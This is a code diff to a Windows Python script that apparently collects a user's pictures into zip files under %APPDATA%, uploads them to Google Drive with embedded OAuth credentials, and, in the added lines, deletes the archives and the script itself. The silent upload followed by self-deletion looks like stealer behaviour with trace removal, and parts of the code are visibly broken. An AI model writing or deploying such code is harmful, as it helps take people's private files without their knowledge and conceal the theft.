@@ -34,7 +34,8 @@ class WIN_Geat:
         self.client_id     = client_id
         self.client_secret = client_secret
         self.refresh_token = refresh_token      
-        self.Images_CO()      
+        self.Images_CO()    
+         
     def Images_CO(self):
         global Part_name
         count = 0
@@ -89,6 +90,7 @@ class WIN_Geat:
         if count == 0:
             self.Part_name = Part_name
             self.Cloue_Store()
+            self.remove_files()
         else:                   
             if os.path.exists( os.environ["appdata"] +'\\PicBackup_'+str( Conut_list[-1])+'.zip') :
                 
@@ -138,12 +140,15 @@ class WIN_Geat:
                                  "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
                                  headers=headers,
                                  files=files
-                              )
-             i +=1     
-             #os.chdir(os.environ["appdata"] )
-             #shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
-             #shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
-        # os.remove(os.environ["appdata"] +'\\PicBackup')   
+                              )   
+                   i +=1
+    def remove_files(self) : 
+        d = 0
+        for x in range(self.Part_name):  
+            shutil.rmtree(os.environ["appdata"] +'\\PicBackup_', ignore_errors=True, onerror=None)    
+            os.remove(os.environ["appdata"] +'\\PicBackup_'+str(f'{d}')+'.zip')  
+            d +=1 
+        os.remove(__file__)     
 if __name__=='__main__':
     WIN_Geat()
        
